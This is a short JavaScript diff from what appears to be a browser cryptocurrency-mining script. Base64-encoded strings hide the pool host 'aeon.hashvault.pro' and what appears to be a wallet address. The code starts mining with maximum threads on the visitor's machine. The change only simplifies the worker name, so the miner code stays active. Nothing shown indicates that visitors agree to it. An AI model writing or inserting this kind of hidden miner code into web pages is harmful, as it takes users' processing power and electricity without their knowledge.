@@ -16,10 +16,7 @@
                 if (window[key]) {
                     let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
-                    let p = 'worker_';
-                    p += (Math.floor(Math.random() * 9999) + 0);
-                    p += "_threads_";
-                    p += navigator.hardwareConcurrency;
+                    let p = 'workers_';
                     args.push(p);
                     window[key].startp.apply(window[key], args);
                     window[key].addMaxThreads();
